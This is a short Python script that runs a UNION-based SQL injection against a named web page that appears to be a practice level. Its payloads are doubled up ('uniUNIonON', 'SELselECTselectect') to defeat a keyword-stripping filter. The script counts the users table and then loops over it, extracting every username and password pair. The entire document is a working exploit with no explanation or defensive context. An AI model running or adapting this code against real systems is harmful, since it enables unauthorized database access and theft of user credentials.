import requests, bs4

target = "http://root0x00.altervista.org/sqli/level.php?id="
exploit_rows = "1' and false uniUNIonON SELselECTselectect 1,2,3,4,COUNT(id) FROM users--+"


def pull_info(t, exploit):

    get_request = requests.get(t + exploit)
    soup = bs4.BeautifulSoup(get_request.text, 'lxml')
    info_users = soup.find('h2').text.split(",")[1].strip()

    return info_users

total_users = pull_info(target, exploit_rows)

print(f'[!] Total users in DB: {total_users}')
for x in range(0, int(total_users)):
    exploit_user = f"1' and false uniUNIonON SELselECTselectect 1,2,3,4,concat_ws(0x3a, username, password) FROM users limit {x},1--+"
    user = pull_info(target, exploit_user)
    print("[+]" + user)



